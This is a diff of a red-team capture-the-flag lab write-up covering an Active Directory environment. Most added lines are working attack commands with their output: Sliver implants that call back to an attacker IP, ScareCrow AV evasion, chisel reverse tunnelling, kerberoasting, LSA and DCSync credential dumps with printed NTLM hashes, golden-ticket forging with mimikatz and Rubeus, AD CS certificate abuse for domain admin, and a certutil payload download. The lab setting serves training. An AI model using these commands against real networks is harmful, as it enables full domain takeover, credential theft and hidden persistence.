@@ -14,11 +14,12 @@ Learnt:
 - Limitations and pitfall of Wordlist generators 
 - Wordlist generator alternative tools
 - Setup Local Email for Red Reasons
-- AlH4zr3d's Phishing and Spearphishing SE leafy-bug strategy 
+- Alh4zr3d's Phishing and Spearphishing SE leafy-bug strategy 
 - `fping` is better than `ping`
-- ScareCrow
+- ScareCrow 
 - Sliver is awesome
 - C2 Workflow
+- AD CS abuse 101
 
 
 
@@ -304,10 +305,10 @@ arp -a
 Persistence just in case of other people using the same vectors
 ```go
 // For VPN
-generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
-generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
-mtls -L 10.50.116.126 -l 11011
-mtls -L 10.50.116.126 -l 11012
+generate --mtls 10.50.114.111:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.114.111:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.114.111 -l 11011
+mtls -L 10.50.114.111 -l 11012
 // Drop on VPN
 nohup ./VPN-update &
 nohup ./VPN-upgrade &
@@ -315,9 +316,9 @@ nohup ./VPN-upgrade &
 
 Setup up chisel server to handle a Dynamic Reverse Proxy 
 ```bash
-./chisel server -host 10.50.116.126 -p 20000 --reverse --socks5 -v
+./chisel server -host 10.50.114.111 -p 20000 --reverse --socks5 -v
 # On the VPN
-nohup ./chisel client 10.50.116.126:20000  R:20001:socks &
+nohup ./chisel client 10.50.114.111:20000  R:20001:socks &
 # comment sock4 ... and add to /etc/proxychains4.conf:
 socks5  127.0.0.1 20001
 ```
@@ -328,27 +329,9 @@ Proxychains and chisel proof
 lisa.moore credentials have been 
 ![](passwordchangeon103.png)
 
-Crackmap Exec
-
-Certipy - 101 with Al
-```bash
-proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.119.102
-```
-
-Web Enrollment is web-based builtin interface to enrollment, which uses ntlm authentication.
-
-Web Enrollment : Disabled - not real life, NTLM relay attack if we could
-Look at Enrollment Rights
-
-If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.
-
-add CORPDC, Server1 to /etc/hosts
-
-Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef)
-
 Bloodhound run with `--dns-tcp` uses dns over tcp which works better over `proxychains`, but this did not work for Al. 
 ```go
-generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+generate beacon --mtls 10.50.114.111:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
 // ScareCrow to bypass Windows Defender - shoot fly with bozaka
 ./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
 // Deploy implant
@@ -356,7 +339,6 @@ generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shell
 // Run .NET assembly in its own process - without a beacon object file!
 execute-assembley -i 
 ```
-
 
 Download with `Google Chrome` from RDP session
 
@@ -367,22 +349,24 @@ SharpHound.ps1 works
 Crying out the credential changing, Tiberious struggles till he get `admin : password1!`
 ![](tibsisinontheweb.png)
 
+Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef)
 
 ## Initial Compromise of Active Directory
 
 
 ```bash
-proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'lisa.moore' -p 'Scientist2006'
+proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.117102 -u 'lisa.moore' -p 'Scientist2006'
 ```
 
-I added 2[[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc
+I added 2 screenshosts to [[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc
 
 ```bash
-proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.102 -request 'corp.thereserve.loc/laura.wood'
+proxychains4 impacket-GetUserSPNs -dc-ip 10.200.117102 -request 'corp.thereserve.loc/laura.wood'
 ```
 
 ![](kerberoastagasm.png)
 
+The svcScanning spn is crackable
 
 ![](bigbypass.png)
 
@@ -504,24 +488,21 @@ At this point I went over my Bloodhound information, then kerberoasted svc accou
 sudo apt install ntpdate
 sudo ntpdate $dc_ip
 
-john hash --format=krb5tgs /usr/share/wordlists/rockyou.txt
+john corp.spns --format=krb5tgs --wordlist=~/RedTeamCapStoneChallenge/lists/mp32-passwd.lst
 - Password1!
 ```
 
-
-
 #### Return for Cthulu Cthursday
-
 
 Returning the day after because of work with [Al](https://www.twitch.tv/videos/1829218217), [Tyler Ramsbey Part 4](https://www.youtube.com/watch?v=qr8eGM1zhV8) and [Tyler Ramsbey Part 5](https://www.youtube.com/watch?v=FRUQMg9IhMA) in the background 
 ```bash
-proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.102 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
+proxychains4 impacket-GetUserSPNs -dc-ip 10.200.117102 -request 'corp.thereserve.loc/mohammad.ahmed' -outputfile krbs-2/corp.spns
 # Extract usernames
 cat corp.spns | awk -F$ '{print $4}' | sed 's/*//g' >> ~/RedTeamCapStoneChallenge/lists/users.txt
 
 svcScanning : Password1!
 
-proxychains4 python3 /opt/BloodHound.py/bloodhound.y --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'svcScanning' -p 'Password1!'
+proxychains4 python3 /opt/BloodHound.py/bloodhound.y --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.117102 -u 'svcScanning' -p 'Password1!'
 
 impacket-ticketConverter $ticket.ccache $ticket.kirbi
 
@@ -531,11 +512,291 @@ export KRB5CCNAME=$(pwd)/$ticket.ccache
 My Bloodhound data was very different so I ran it again..but then we can psremote into server01!
 ![](wecanpsremoteintoserver1.png)
 
+####  Return to take the next 17 flags!
 
-https://redsiege.com/blog/2022/11/introduction-to-sliver/
-https://seamlessintelligence.com.au/sliver_1.html
-https://seamlessintelligence.com.au/sliver_2.html
-https://seamlessintelligence.com.au/sliver_3.html
+```bash
+/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain bing.com -obfu
+# Became:
+/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/WRK1/WRK01.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+# cd to  directory and build
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+# permissions, mv binary to rename back to Sliver generation name of the self-signed cert
+# UPX!
+upx 
+# I lost 60% of the binary size, not even using brute!
+```
+
+I then tried kerberoasting from within my Beacon, which is just more awesomeness
+![](sliverrubeuskerberoast.png)
+Also it supports RC4_HMAC so we can create Skeleton Keys like the mid 2010s APT. 
+
+And following back along with Al once re-re-re-re-hacked to the same point and improved my Sliver cheatsheet
+![](svcScanningactuallypwned.png)
+
+Al with cme flags - Domain Cache Credentials - LSA are cached credentials stored in the registry. If 
+```bash
+# You have local admin
+
+proxychains4 crackmapexec smb 10.200.117.31 -u 'svcScanning' -p 'Password1!' --lsa
+
+```
+
+
+![](cmeserv1lsaof.png)
+See [[Red-Team-Capstone-Challenge-Credentials]], the log from cme was not complete
+Actual password of 
+- svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G 
+
+If you have local administrator access you can decrypt these passwords in the registry, which stored encrypted it is just that we have access to the encryption that it is trivial to decrypt.
+![](svcbackuphasdcsync-bh.png)
+
+Easiest way to get detected in the modern times of red teaming
+- Try to set wdigest registry key - All EDR monitor for this apparently.
+- Avoid touching the lsass process
+- Unhooking has alerts
+
+For the screenshot after multiple days.. of not press play on the VoD
+![](svcbackupconfirmation.png)
+
+I DC synced to experience it and to collect the hashes.
+```bash
+proxychains4 impacket-secretsdump -just-dc -dc-ip 10.200.117.102 corp.thereserve.loc/svcBackups@10.200.117.102 -outputfile dcsync-dump.hashes
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
+THMSetup:1008:aad3b435b51404eeaad3b435b51404ee:0ea3e204f310f846e282b0c7f9ca3af2:::
+lisa.moore:1125:aad3b435b51404eeaad3b435b51404ee:e4c1c1ba3b6dbdaf5b08485ce9cbc1cf:::
+lisa.jenkins:1126:aad3b435b51404eeaad3b435b51404ee:94ef2aa6af7f6397e4164b40afb86eef:::
+charlotte.smith:1127:aad3b435b51404eeaad3b435b51404ee:1f9b5ecdf08d6f0c39a2255d99de7c6a:::
+...
+# For just krbtgt
+proxychains4 impacket-secretsdump -just-dc-user CORP/krbtgt -dc-ip 10.200.117.102 corp.thereserve.loc/svcBackups@10.200.117.102 -outputfile dcsync-dump.hashes
+# Generate any kerberos ticket for any account 
+0c757a3445acb94a654554f3ac529ede
+```
+
+Gold Ticket creation:
+
+Requirements:
+- KRBTGT account's password hash
+- domain name, domain SID, and user ID of account to be impersonated
+
+- With KRBTGT user hash - we don't need the password hash of the account we want to impersonate, it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
+- KDC will only validate the user account specified in the TGT **if the account is older than 20 minutes**
+	- Allowing for disabled, deleted, or non-existent account in the TGT 
+- TGT no older than 20 minutes!
+- TGT sets the policies and rules, Golden Tickets can overwrite the KDC 
+- By default, the KRBTGT account's password never changes
+	- Blue team would have to rotate the KRBTGT account password atleast twice, is an incredibly painful process for the blue team
+		- Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
+- Golden Tickets allow even bypass smart card authentication as smart cards are verified by the DC before it creates the TGT.
+- Golden ticket can created non-domain joined machines!
+
+T0_Josh.sutton is a DA on CORP.THERESERVE.LOC
+```json
+// T0_JOSH.SUTTON
+CORP.THERESERVE.LOC : domain name,
+S-1-5-21-170228521-1485475711-3199862024-1853 : user ID, // -1853
+S-1-5-21-170228521-1485475711-3199862024 : domain SID
+```
+
+```c
+kerberos::golden /admin:t0_josh.sutton /domain:CORP.THERESERVE.LOC /id:1853 /sid:S-1-5-21-170228521-1485475711-3199862024/krbtgt:0c757a3445acb94a654554f3ac529ede /endin:600 /renewmax:10080 /ptt
+```
+
+-   **/admin** - The username we want to impersonate. This does not have to be a valid user.  
+-   **/domain** - The FQDN of the domain we want to generate the ticket for.  
+-   **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
+-   **/sid** -The SID of the domain we want to generate the ticket for.
+-   **/krbtgt** -The NTLM hash of the KRBTGT account.  
+-   **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
+-   **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  
+-   **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session now
+
+With Rubeus
+```csharp
+//  ______        _
+// (_____ \      | |
+//  _____) )_   _| |__  _____ _   _  ___
+// |  __  /| | | |  _ \| ___ | | | |/___)
+// | |  \ \| |_| | |_) ) ____| |_| |___ |
+// |_|   |_|____/|____/|_____)____/(___/
+
+
+// krbtgt:aes256-cts-hmac-sha1-96:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
+// krbtgt:aes128-cts-hmac-sha1-96:7b3bb3c8cb4d2088bcf66834e1ee25d7
+// krbtgt:des-cbc-md5:4c7f49bc8c43ae5b
+
+// T0_JOSH.SUTTON
+CORP.THERESERVE.LOC : domain name,
+S-1-5-21-170228521-1485475711-3199862024-1853 : user ID, // -1853
+S-1-5-21-170228521-1485475711-3199862024 : domain SID
+
+// Inside of Sliver 
+Rubeus golden /aes256:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
+```
+
+
+```go
+
+[server] sliver (EAGER_PUT) > rubeus golden /aes256:899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055 /ldap /user:t0_josh.sutton /printcmd
+
+[*] rubeus output:
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.1
+
+[*] Action: Build TGT
+
+[*] Trying to query LDAP using LDAPS for user information on domain controller CORPDC.corp.thereserve.loc
+[*] Searching path 'DC=corp,DC=thereserve,DC=loc' for '(samaccountname=t0_josh.sutton)'
+[*] Retrieving group and domain policy information over LDAP from domain controller CORPDC.corp.thereserve.loc
+[*] Searching path 'DC=corp,DC=thereserve,DC=loc' for '(|(distinguishedname=CN=Tier 0 Admins,OU=Groups,DC=corp,DC=thereserve,DC=loc)(objectsid=S-1-5-21-170228521-1485475711-3199862024-513)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))'
+[*] Attempting to mount: \\corpdc.corp.thereserve.loc\SYSVOL
+[*] \\corpdc.corp.thereserve.loc\SYSVOL successfully mounted
+[*] Attempting to unmount: \\corpdc.corp.thereserve.loc\SYSVOL
+[*] \\corpdc.corp.thereserve.loc\SYSVOL successfully unmounted
+[*] Retrieving netbios name information over LDAP from domain controller CORPDC.corp.thereserve.loc
+[*] Searching path 'CN=Configuration,DC=thereserve,DC=loc' for '(&(netbiosname=*)(dnsroot=corp.thereserve.loc))'
+[*] Building PAC
+
+[*] Domain         : CORP.THERESERVE.LOC (CORP)
+[*] SID            : S-1-5-21-170228521-1485475711-3199862024
+[*] UserId         : 1853
+[*] Groups         : 1119,513
+[*] ServiceKey     : 899F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
+[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] KDCKey         : 899F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055
+[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
+[*] Service        : krbtgt
+[*] Target         : corp.thereserve.loc
+
+[*] Generating EncTicketPart
+[*] Signing PAC
+[*] Encrypting EncTicketPart
+[*] Generating Ticket
+[*] Generated KERB-CRED
+[*] Forged a TGT for 't0_josh.sutton@corp.thereserve.loc'
+
+[*] AuthTime       : 5/28/2023 12:03:39 PM
+[*] StartTime      : 5/28/2023 12:03:39 PM
+[*] EndTime        : 5/28/2023 10:03:39 PM
+[*] RenewTill      : 6/4/2023 12:03:39 PM
+
+[*] base64(ticket.kirbi):
+
+      doIFmTCCBZWgAwIBBaEDAgEWooIEajCCBGZhggRiMIIEXqADAgEFoRUbE0NPUlAuVEhFUkVTRVJWRS5M
+      T0OiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE2NvcnAudGhlcmVzZXJ2ZS5sb2OjggQUMIIEEKADAgESoQMC
+      AQOiggQCBIID/uqaUxvD07+l5m5U1UwGFIJqwDpTiCnslA+4ai8sDfmnLn5OG1eSDp6ozVZAgMaHlxBE
+      tu4CDINkbNENf4dyEsMHC+/GbobuFIcF5boHIx4Ihz8AZGmU6vHHwMCDypY9NQAISntFd/lRRFtoJVMW
+      LnfPv8TTcy4V4aCf7WLPmwASMW/AsBmGKRti4Znn2Xr6fYQMiotIC+USe3grWeMOmdn8uI1tt0V+/znr
+      UpjOqSvyJSUcK+rE0Zl7mptG+wsw9QLMpq42WjuDOv/TDRMd5iqtBdFycjh5bx86oA4MElx8rvhSFSfO
+      FTKnjR6BfyEcNOb6Xhsikhxos4vAHj8MNPBwGMJWVJLxqt2E6qOlIUikZpV92IEb8S8Z5XfUE8fXYHOr
+      x59LzswwBsMVrrdzH8yh49pcNR1du8nL1C8Ppu5WoHbDVsF8rICwg1zG8WG2fbH1fnRteRxqYxUZEc2w
+      B/hCysp3wEWPKEkruR9sMH86J/PwsmTkrdxNGp/ZuUyoVx4xAha+KMDYmxi5kHdNvRTnh8FgtUhaySqk
+      Yzx5ASgMllMpjYLvfp65gQGKcoQwchOm8t6vnnRhYkKGl2R811QE+xDvufzyU0vDEVuNHdErQeS7e6GL
+      bT3WdbUUDLo8gBg7qRZOrycpQRzAeUQ6nezxhhIQAIW4rfn9qmTNyftt2TNyNJnAAqbKg6kKgWKr68vP
+      V9EXUUXoIxapxtpFLPfXSS0WINBzNdifQV5Ifgy+ysjQZhUM0PQwGhNT6U/LoonjKlX5QLxsKo6hFK2u
+      deii8d/6iiS2eMWo6rDcGa6Sr0F5Wx0v/BPfjaai7L1Td0ZikGB8e+jIeNPXcs5XXHF6EDezVQgl9QTS
+      ZG/BQSvlKC1+uXjnPP9WBMjkaN2Dt02QE8SEKe6v2FA4Z/HMgLC8ZV8wHCrt+Z19HU0isGXaDz8N4p1v
+      QgRWVOD3VVOy0k6YeFQ2NkEIH+/yL+ZhI2nZz8X3pbM5n4yJfwqyLu93HnnKPpmbOv6IVvfajS7Rh1ch
+      jUuL04ljK/YPELr60LTLTxBCS6C4JYODNGnAhxGYmPKN29BFzvnai3gZlAPUflJYP7RqQ3PoXKX3Qiyt
+      lZHDNIQGAXMqxquK/eF6254bVFDcoxeO82UeFvM5qOnnd0nvSLDp0klhFPE9eeYxb9kN8PMoUD4ss0V8
+      wJ/m2h0bW7qVYDIJcMeOGVjoXg9GJIvFmIIebrjZVjjsx+2zCExuaQWBHJDrLcGdsQgqDWFxOceT9qK2
+      uggpJRMC5uaNnbvOAcUwgwlze7T/iu6hENlWuvJbdKfEeURJnVw3AysDR28AVTFl98c2eiCYXc1VmQWr
+      NS37EB6rSy55zHtVo4IBGTCCARWgAwIBAKKCAQwEggEIfYIBBDCCAQCggf0wgfowgfegKzApoAMCARKh
+      IgQgtdPB4js8dV3dGGzH6AEgXbVLFLkN3eve2UaBGF8KUGKhFRsTQ09SUC5USEVSRVNFUlZFLkxPQ6Ib
+      MBmgAwIBAaESMBAbDnQwX2pvc2guc3V0dG9uowcDBQBA4AAApBEYDzIwMjMwNTI4MTIwMzM5WqURGA8y
+      MDIzMDUyODEyMDMzOVqmERgPMjAyMzA1MjgyMjAzMzlapxEYDzIwMjMwNjA0MTIwMzM5WqgVGxNDT1JQ
+      LlRIRVJFU0VSVkUuTE9DqSgwJqADAgECoR8wHRsGa3JidGd0GxNjb3JwLnRoZXJlc2VydmUubG9j
+
+
+
+[*] Printing a command to recreate a ticket containing the information used within this ticket
+
+c:\windows\system32\notepad.exe golden /aes256:899F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055 /user:t0_josh.sutton /id:1853 /pgid:513 /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /pwdlastset:"2/14/2023 5:40:31 AM" /minpassage:1 /displayname:"Josh Sutton" /netbios:CORP /groups:1119,513 /dc:CORPDC.corp.thereserve.loc /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
+```
+
+Next thing I wanted to do is create the ultimate User from this ticket so that I am not other ruining anyone else on the network. 
+
+Watching Al Stream here and there.
+
+![](dcsyncisgreaterthanmsreed.png)
+
+We need login to the DC and dc-sync another DC as that looks normal! 
+
+Certipy - 101 with Al - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
+```bash
+# This worked a week ago
+proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.117.102
+# This did not work
+proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.117.102
+```
+I got this error
+![](certipyerror.png)
+And with the pip3 version
+![](pip3versionofcertipy.png)
+
+Certificate Authority are setup to sign encryption, authentication, emails, TLS/SSL encrytion, governance and policy. PKI is Public Key infrastructure, Microsoft AD CS is the builtin PKI. Commonly used for generate SSL for internal certificates for internal websites.
+![](selfsigncertificateimageforexplaination.png)
+
+Al discussed Web Enrollment is (Custom template) web-based builtin interface to enrollment, which uses NTLM authentication. Web Enrollment : Disabled - not real life, NTLM relay attack if we could. 
+- Custom Templates
+- Look at Enrollment Rights
+- If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.
+
+EnrolleeSuppliesSubject can request as SERVER01 can add a domain administrator as we can add Subject Alt names. Subject Alt names helps the management of certificates, but we can then use this certificate can be used in a different domain.
+
+Extended Key Usage: defines authentication key usage
+- if set to `Any Purpose` which is instant DA.  
+
+svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G
+
+```python
+# It will always timeout the first time!
+# -target must be the AD CS server
+# -template must be the actually name not the display name 
+proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.117.102 -ns 10.200.117.102
+# First time will always timeout 
+openssl x509 -in administrator_corpdc.pfx -text -noout
+```
+
+DNS issues persist, but the room creator states we could do this all manually as Al had indicated from his upcoming course, via RDPing in. then apparently it will always timeout the first time:
+![1080](adcsexploit.png)
+
+```bash
+proxychains4 certipy-ad auth -dc-ip 10.200.117.102 -ns 10.200.117.102 -pfx administrator_corpdc.pfx
+
+'administrator@corp.thereserve.loc': aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e
+```
+
+Because of PKInit you will receive the NTLM hashes from doing a S4U attack.
+![](wowdchash.png)
+
+am03bam4n - Out of interest, have you exploited this AD CS issue when a DC does not have a DC Kerberos cert installed?
+SChannel is a created LDAP session with a certificate.
+
+
+```bash
+export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache
+
+proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.117.102 Administrator@CORPDC.corp.thereserve.loc
+```
+![](wmiexecontothedc.png)
+
+```powershell
+certutil.exe -urlcache -split -f http://10.50.114.111:8443/Word.exe Word.exe
+```
+
+
+
 https://tishina.in/opsec/sliver-opsec-notes#implant%20obfuscation%20and%20export%20formats
 https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
 https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
